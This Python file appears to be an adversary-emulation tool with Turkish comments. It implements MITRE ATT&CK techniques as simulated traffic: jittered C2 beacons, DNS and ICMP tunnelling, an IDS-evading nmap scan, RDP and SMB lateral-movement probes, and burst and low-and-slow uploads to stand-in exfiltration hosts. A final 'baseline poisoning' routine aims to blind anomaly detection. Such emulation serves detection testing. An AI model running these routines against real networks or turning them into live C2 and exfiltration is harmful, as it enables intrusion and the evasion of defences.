import requests
import base64
import uuid
import random
import time
import socket
import struct
import os
from datetime import datetime
import dns.resolver
import threading


class MITRETactics:
    """
    MITRE ATT&CK Framework teknikleri
    T1071.001, T1071.004, T1046, T1095, T1021.001, T1021.002, T1041, T1562
    """
    
    # ========== T1071.001 / T1071.004 - Beacon & DNS Tunnel ==========
    
    def t1071_001_beacon(self, targets: list, beacon_count: int = 50, jitter: bool = True) -> dict:
        """
        T1071.001 - Application Layer Protocol: Web Protocols
        Jitter'lı C2 beacon simülasyonu
        """
        fake_domains = [
            "http://update-check-01.fakecdn.net",
            "http://cdn-metrics-secure.fakecdn.net", 
            "http://ms-office-update.fakecdn.net",
            "http://windows-defender-update.fakecdn.net"
        ]
        
        results = {
            'technique': 'T1071.001',
            'tactic': 'Command and Control',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        for ip in targets:
            beacons = []
            for i in range(beacon_count):
                domain = random.choice(fake_domains)
                bot_id = base64.b64encode(f"{ip}-{uuid.uuid4().hex[:8]}".encode()).decode()
                
                # Jitter: Rastgele gecikme (gerçek C2'lerde yaygın)
                if jitter:
                    sleep_time = random.gauss(60, 20)  # Ortalama 60s, std 20s
                    sleep_time = max(10, sleep_time)  # Minimum 10s
                else:
                    sleep_time = 60
                
                try:
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101'
                        ]),
                        'X-Bot-ID': bot_id,
                        'X-Session-ID': uuid.uuid4().hex[:16],
                        'Content-Type': 'application/octet-stream'
                    }
                    
                    resp = requests.get(
                        f"{domain}/checkin?id={bot_id}&seq={i}",
                        headers=headers,
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    beacons.append({
                        'seq': i,
                        'status': resp.status_code,
                        'jitter': round(sleep_time, 2),
                        'domain': domain.split('/')[2]
                    })
                    
                except Exception as e:
                    beacons.append({
                        'seq': i,
                        'error': str(e)[:50],
                        'jitter': round(sleep_time, 2),
                        'expected': True
                    })
                
                time.sleep(sleep_time)
            
            results['targets'][ip] = {
                'total_beacons': len(beacons),
                'avg_jitter': round(sum(b['jitter'] for b in beacons) / len(beacons), 2),
                'unique_domains': len(set(b.get('domain', '') for b in beacons)),
                'sample': beacons[:5]
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    def t1071_004_dns_tunnel(self, targets: list, query_count: int = 100) -> dict:
        """
        T1071.004 - Application Layer Protocol: DNS
        DNS tünelleme simülasyonu - gerçekçi veri exfiltrasyonu pattern'i
        """
        results = {
            'technique': 'T1071.004',
            'tactic': 'Command and Control',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        for ip in targets:
            queries = []
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8']
            
            for i in range(query_count):
                # Gerçekçi encoded data (base32 daha yaygın DNS'te)
                data = base64.b32encode(f"{ip}|{i}|{uuid.uuid4().hex[:8]}".encode()).decode().replace('=', '')
                
                # Subdomain bölme (DNS max 63 char per label)
                chunks = [data[j:j+63] for j in range(0, len(data), 63)]
                subdomain = '.'.join(chunks)
                domain = f"{subdomain}.fake-tunnel-{random.randint(1,5)}.com"
                
                try:
                    start = time.time()
                    resolver.resolve(domain, 'TXT')  # TXT kaydı daha yaygın tünellemede
                    queries.append({
                        'seq': i,
                        'len': len(domain),
                        'type': 'TXT',
                        'res': 'RESOLVED',
                        'time': round(time.time() - start, 3)
                    })
                except dns.resolver.NXDOMAIN:
                    queries.append({
                        'seq': i,
                        'len': len(domain),
                        'type': 'TXT',
                        'res': 'NXDOMAIN',
                        'note': 'Expected - fake domain'
                    })
                except Exception as e:
                    queries.append({
                        'seq': i,
                        'len': len(domain),
                        'error': str(e)[:40]
                    })
                
                # Gerçekçi bekleme
                time.sleep(random.uniform(0.5, 3.0))
            
            results['targets'][ip] = {
                'total_queries': len(queries),
                'avg_length': round(sum(q['len'] for q in queries) / len(queries), 2),
                'max_length': max(q['len'] for q in queries),
                'txt_queries': sum(1 for q in queries if q.get('type') == 'TXT'),
                'sample': queries[:5]
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    # ========== T1046 - Ağ Keşfi ve Tarama ==========
    
    def t1046_slow_scan(self, targets: list) -> dict:
        """
        T1046 - Network Service Discovery
        Çok yavaş, sessiz port taraması (IDS kaçınma)
        """
        import nmap
        
        results = {
            'technique': 'T1046',
            'tactic': 'Discovery',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        nm = nmap.PortScanner()
        
        for ip in targets:
            try:
                # T0: Paranoid (en yavaş), rastgele port sırası, fragmentasyon
                nm.scan(
                    ip,
                    arguments='-sS -sV -T0 --max-retries 1 --max-rtt-timeout 500ms '
                              '--scan-delay 5s --randomize-hosts --fragment-data 8 '
                              '--source-port 53 --data-length 24'
                )
                
                host_data = nm[ip] if ip in nm.all_hosts() else {}
                open_ports = list(host_data.get('tcp', {}).keys())
                
                results['targets'][ip] = {
                    'scan_type': 'slow_sparse',
                    'timing': 'T0 (Paranoid)',
                    'open_ports': open_ports,
                    'total_found': len(open_ports),
                    'services': {str(p): host_data['tcp'][p].get('name', 'unknown') 
                                for p in open_ports} if open_ports else {},
                    'scan_duration': 'slow - intentional'
                }
                
            except Exception as e:
                results['targets'][ip] = {'error': str(e)}
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    # ========== T1095 - Standart Dışı Tüneller ==========
    
    def t1095_icmp_tunnel(self, targets: list, packet_count: int = 30) -> dict:
        """
        T1095 - Non-Application Layer Protocol
        Boyutu şişirilmiş ICMP paketleri
        """
        results = {
            'technique': 'T1095',
            'tactic': 'Command and Control',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        for ip in targets:
            packets = []
            
            for i in range(packet_count):
                # Normal ping 64 byte, biz 1400 byte yapacağız (MTU'ya yakın)
                payload_size = random.randint(1000, 1400)
                payload = os.urandom(payload_size)
                
                try:
                    # Raw socket ile custom ICMP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.settimeout(5)
                    
                    # ICMP Echo Request header (type=8, code=0)
                    icmp_header = struct.pack('!BBHHH', 8, 0, 0, random.randint(1000, 9999), i)
                    
                    # Checksum hesapla
                    packet = icmp_header + payload
                    
                    sock.sendto(packet, (ip, 0))
                    
                    packets.append({
                        'seq': i,
                        'payload_size': payload_size,
                        'type': 'ICMP_ECHO_CUSTOM',
                        'note': 'Oversized payload - tunnel indicator'
                    })
                    
                except PermissionError:
                    # Root yetkisi yoksa subprocess ile dene
                    try:
                        import subprocess
                        # ping -s ile büyük payload
                        subprocess.run(
                            ['ping', '-c', '1', '-s', str(payload_size), '-W', '2', ip],
                            capture_output=True, timeout=5
                        )
                        packets.append({
                            'seq': i,
                            'payload_size': payload_size,
                            'type': 'ICMP_ECHO_LARGE',
                            'method': 'subprocess'
                        })
                    except Exception as e2:
                        packets.append({
                            'seq': i,
                            'error': str(e2)[:50]
                        })
                except Exception as e:
                    packets.append({
                        'seq': i,
                        'error': str(e)[:50]
                    })
                
                time.sleep(random.uniform(2, 8))
            
            results['targets'][ip] = {
                'total_packets': len(packets),
                'avg_payload': round(sum(p.get('payload_size', 0) for p in packets) / len(packets), 2),
                'oversized_count': sum(1 for p in packets if p.get('payload_size', 0) > 1000),
                'sample': packets[:5]
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    def t1095_raw_tcp(self, targets: list, duration: int = 300) -> dict:
        """
        T1095 - Ham TCP bağlantıları (uzun süreli)
        """
        results = {
            'technique': 'T1095',
            'tactic': 'Command and Control',
            'sub_technique': 'raw_tcp_tunnel',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        for ip in targets:
            connections = []
            
            # Rastgele portlara uzun süreli bağlantılar
            for port in random.sample([443, 8080, 8443, 9001, 4444], min(3, len([443, 8080, 8443, 9001, 4444]))):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((ip, port))
                    
                    # Bağlantıyı açık tut (keep-alive)
                    start = time.time()
                    while time.time() - start < duration:
                        # Minimal data gönder (heartbeat)
                        try:
                            sock.send(b'\x00' * random.randint(1, 10))
                            time.sleep(random.uniform(10, 30))
                        except:
                            break
                    
                    conn_duration = time.time() - start
                    sock.close()
                    
                    connections.append({
                        'port': port,
                        'duration': round(conn_duration, 2),
                        'data_exchanged': 'minimal_keepalive',
                        'type': 'raw_tcp_long_lived'
                    })
                    
                except Exception as e:
                    connections.append({
                        'port': port,
                        'error': str(e)[:50],
                        'type': 'connection_failed'
                    })
            
            results['targets'][ip] = {
                'total_attempts': len(connections),
                'successful_long': sum(1 for c in connections if 'duration' in c),
                'sample': connections
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    # ========== T1021.001 / T1021.002 - Yatay Hareket ==========
    
    def t1021_001_rdp_lateral(self, targets: list) -> dict:
        """
        T1021.001 - Remote Services: Remote Desktop Protocol
        RDP üzerinden lateral movement simülasyonu
        """
        results = {
            'technique': 'T1021.001',
            'tactic': 'Lateral Movement',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        for src_ip in targets:
            attempts = []
            
            for dst_ip in targets:
                if src_ip == dst_ip:
                    continue
                
                # RDP port 3389'a bağlantı denemesi
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    start = time.time()
                    result = sock.connect_ex((dst_ip, 3389))
                    conn_time = time.time() - start
                    
                    if result == 0:
                        # RDP handshake başlat (gerçekçi)
                        # RDP Connection Request
                        rdp_request = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
                        sock.send(rdp_request)
                        
                        # Response bekle
                        try:
                            resp = sock.recv(1024)
                            attempts.append({
                                'src': src_ip,
                                'dst': dst_ip,
                                'port': 3389,
                                'rdp_accessible': True,
                                'response_len': len(resp),
                                'conn_time': round(conn_time, 3),
                                'result': 'RDP_HANDSHAKE_INITIATED'
                            })
                        except:
                            attempts.append({
                                'src': src_ip,
                                'dst': dst_ip,
                                'port': 3389,
                                'rdp_accessible': True,
                                'result': 'PORT_OPEN_NO_HANDSHAKE'
                            })
                    else:
                        attempts.append({
                            'src': src_ip,
                            'dst': dst_ip,
                            'port': 3389,
                            'rdp_accessible': False,
                            'result': 'PORT_CLOSED'
                        })
                    
                    sock.close()
                    
                except Exception as e:
                    attempts.append({
                        'src': src_ip,
                        'dst': dst_ip,
                        'error': str(e)[:50]
                    })
                
                time.sleep(random.uniform(1, 3))
            
            results['targets'][src_ip] = {
                'targets_scanned': len(targets) - 1,
                'rdp_found': sum(1 for a in attempts if a.get('rdp_accessible')),
                'total_attempts': len(attempts),
                'sample': attempts[:5]
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    def t1021_002_smb_lateral(self, targets: list) -> dict:
        """
        T1021.002 - Remote Services: SMB/Windows Admin Shares
        SMB üzerinden lateral movement
        """
        results = {
            'technique': 'T1021.002',
            'tactic': 'Lateral Movement',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        for src_ip in targets:
            attempts = []
            
            for dst_ip in targets:
                if src_ip == dst_ip:
                    continue
                
                # SMB port kontrolü ve admin share erişim denemesi
                try:
                    # Port 445 kontrolü
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    if sock.connect_ex((dst_ip, 445)) == 0:
                        # SMB handshake başlat (gerçekçi)
                        # SMB Negotiate Protocol Request
                        smb_negotiate = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00'
                        
                        sock.send(smb_negotiate)
                        
                        try:
                            resp = sock.recv(4096)
                            attempts.append({
                                'src': src_ip,
                                'dst': dst_ip,
                                'port': 445,
                                'smb_accessible': True,
                                'negotiate_response': len(resp),
                                'result': 'SMB_NEGOTIATE_SUCCESS'
                            })
                        except:
                            attempts.append({
                                'src': src_ip,
                                'dst': dst_ip,
                                'port': 445,
                                'smb_accessible': True,
                                'result': 'PORT_OPEN_NO_RESPONSE'
                            })
                    else:
                        attempts.append({
                            'src': src_ip,
                            'dst': dst_ip,
                            'port': 445,
                            'smb_accessible': False,
                            'result': 'PORT_CLOSED'
                        })
                    
                    sock.close()
                    
                except Exception as e:
                    attempts.append({
                        'src': src_ip,
                        'dst': dst_ip,
                        'error': str(e)[:50]
                    })
                
                time.sleep(random.uniform(0.5, 2))
            
            results['targets'][src_ip] = {
                'targets_scanned': len(targets) - 1,
                'smb_found': sum(1 for a in attempts if a.get('smb_accessible')),
                'total_attempts': len(attempts),
                'sample': attempts[:5]
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    # ========== T1041 - Veri Sızdırma ==========
    
    def t1041_burst_exfil(self, targets: list, total_mb: int = 50) -> dict:
        """
        T1041 - Exfiltration Over C2 Channel
        Tek seferde (burst) büyük veri transferi
        """
        results = {
            'technique': 'T1041',
            'tactic': 'Exfiltration',
            'sub_technique': 'burst',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        fake_endpoint = "http://data-exfil-cdn.fakebackup.net/upload"
        
        for ip in targets:
            # Büyük dummy veri oluştur
            dummy = os.urandom(total_mb * 1024 * 1024)
            chunks = []
            chunk_size = 1024 * 1024  # 1MB chunk'lar
            
            start_time = time.time()
            
            for i in range(0, len(dummy), chunk_size):
                chunk = dummy[i:i+chunk_size]
                try:
                    resp = requests.post(
                        fake_endpoint,
                        data=chunk,
                        headers={
                            'Content-Type': 'application/octet-stream',
                            'X-File-Name': f'archive_{uuid.uuid4().hex[:8]}.zip',
                            'X-Chunk-Num': str(i // chunk_size),
                            'X-Total-Chunks': str(total_mb)
                        },
                        timeout=15
                    )
                    chunks.append({
                        'chunk': i // chunk_size + 1,
                        'status': resp.status_code,
                        'size': len(chunk)
                    })
                except Exception as e:
                    chunks.append({
                        'chunk': i // chunk_size + 1,
                        'error': str(e)[:50]
                    })
            
            duration = time.time() - start_time
            
            results['targets'][ip] = {
                'total_mb': total_mb,
                'chunks_sent': len(chunks),
                'duration_sec': round(duration, 2),
                'throughput_mbps': round(total_mb / duration, 2) if duration > 0 else 0,
                'method': 'burst',
                'destination': fake_endpoint
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    def t1041_low_and_slow(self, targets: list, total_mb: int = 10, duration_minutes: int = 60) -> dict:
        """
        T1041 - Low and Slow exfiltration
        Çok yavaş, gizli veri transferi
        """
        results = {
            'technique': 'T1041',
            'tactic': 'Exfiltration',
            'sub_technique': 'low_and_slow',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        fake_endpoint = "http://slow-sync-backup.fakecdn.net/api/v1/sync"
        
        for ip in targets:
            bytes_sent = 0
            target_bytes = total_mb * 1024 * 1024
            transfers = []
            
            start_time = time.time()
            end_time = start_time + (duration_minutes * 60)
            
            while time.time() < end_time and bytes_sent < target_bytes:
                # Çok küçük parçalar (1-5 KB)
                chunk_size = random.randint(1024, 5120)
                chunk = os.urandom(chunk_size)
                
                try:
                    resp = requests.post(
                        fake_endpoint,
                        data=chunk,
                        headers={
                            'Content-Type': 'application/json',
                            'X-Sync-ID': uuid.uuid4().hex[:16],
                            'X-Device-ID': base64.b64encode(ip.encode()).decode()[:20]
                        },
                        timeout=10
                    )
                    
                    bytes_sent += chunk_size
                    transfers.append({
                        'bytes': chunk_size,
                        'total_sent': bytes_sent,
                        'status': resp.status_code
                    })
                    
                except Exception as e:
                    transfers.append({
                        'bytes': chunk_size,
                        'error': str(e)[:50]
                    })
                
                # Uzun bekleme (low and slow)
                sleep_time = random.gauss(30, 10)  # Ortalama 30s
                sleep_time = max(5, sleep_time)
                time.sleep(sleep_time)
            
            actual_duration = time.time() - start_time
            
            results['targets'][ip] = {
                'total_mb': round(bytes_sent / (1024*1024), 2),
                'target_mb': total_mb,
                'transfers': len(transfers),
                'duration_sec': round(actual_duration, 2),
                'avg_interval_sec': round(actual_duration / len(transfers), 2) if transfers else 0,
                'throughput_kbps': round((bytes_sent * 8) / actual_duration / 1024, 2) if actual_duration > 0 else 0,
                'method': 'low_and_slow'
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results
    
    # ========== T1562 - Baseline Zehirleme ==========
    
    def t1562_baseline_poison(self, targets: list, duration_hours: int = 4) -> dict:
        """
        T1562.001 - Impair Defenses: Disable or Modify Tools
        Baseline zehirleme - motorun normal algısını manipüle etme
        """
        results = {
            'technique': 'T1562',
            'tactic': 'Defense Evasion',
            'sub_technique': 'baseline_poisoning',
            'start_time': datetime.now().isoformat(),
            'targets': {}
        }
        
        duration_seconds = duration_hours * 3600
        end_time = time.time() + duration_seconds
        
        for ip in targets:
            activities = []
            start = time.time()
            
            while time.time() < end_time:
                # Çok düşük hacimli, "normal görünümlü" aktiviteler
                activity_type = random.choice([
                    'dns_query_normal',      # Normal DNS
                    'http_get_small',        # Küçük HTTP
                    'icmp_ping_single',      # Tek ping
                    'tcp_syn_no_payload',    # Boş SYN
                ])
                
                try:
                    if activity_type == 'dns_query_normal':
                        # Normal görünümlü DNS
                        resolver = dns.resolver.Resolver()
                        resolver.nameservers = ['8.8.8.8']
                        domain = f"{random.choice(['www','mail','cdn'])}.{random.choice(['google','microsoft','cloudflare'])}.com"
                        resolver.resolve(domain, 'A')
                        activities.append({'type': 'dns_normal', 'domain': domain})
                        
                    elif activity_type == 'http_get_small':
                        # Küçük, normal HTTP
                        resp = requests.get(
                            f"http://{random.choice(['example.com','httpbin.org'])}/get",
                            timeout=5,
                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                        )
                        activities.append({'type': 'http_small', 'status': resp.status_code})
                        
                    elif activity_type == 'icmp_ping_single':
                        import subprocess
                        subprocess.run(
                            ['ping', '-c', '1', '-W', '2', random.choice(['8.8.8.8', '1.1.1.1'])],
                            capture_output=True, timeout=5
                        )
                        activities.append({'type': 'icmp_single'})
                        
                    elif activity_type == 'tcp_syn_no_payload':
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect_ex((random.choice(targets), random.choice([80, 443])))
                        sock.close()
                        activities.append({'type': 'tcp_syn_empty'})
                        
                except Exception as e:
                    activities.append({'type': activity_type, 'error': str(e)[:30]})
                
                # Çok uzun aralıklar (normal trafiğe karıştırma)
                sleep_time = random.gauss(300, 60)  # Ortalama 5 dakika
                sleep_time = max(60, sleep_time)
                time.sleep(sleep_time)
            
            actual_duration = time.time() - start
            
            results['targets'][ip] = {
                'total_activities': len(activities),
                'duration_hours': round(actual_duration / 3600, 2),
                'activity_breakdown': {
                    'dns_normal': sum(1 for a in activities if a['type'] == 'dns_normal'),
                    'http_small': sum(1 for a in activities if a['type'] == 'http_small'),
                    'icmp_single': sum(1 for a in activities if a['type'] == 'icmp_single'),
                    'tcp_syn_empty': sum(1 for a in activities if a['type'] == 'tcp_syn_empty')
                },
                'avg_interval_min': round((actual_duration / len(activities)) / 60, 2) if activities else 0,
                'intention': 'BASELINE_POISON - low volume to manipulate learning'
            }
        
        results['end_time'] = datetime.now().isoformat()
        return results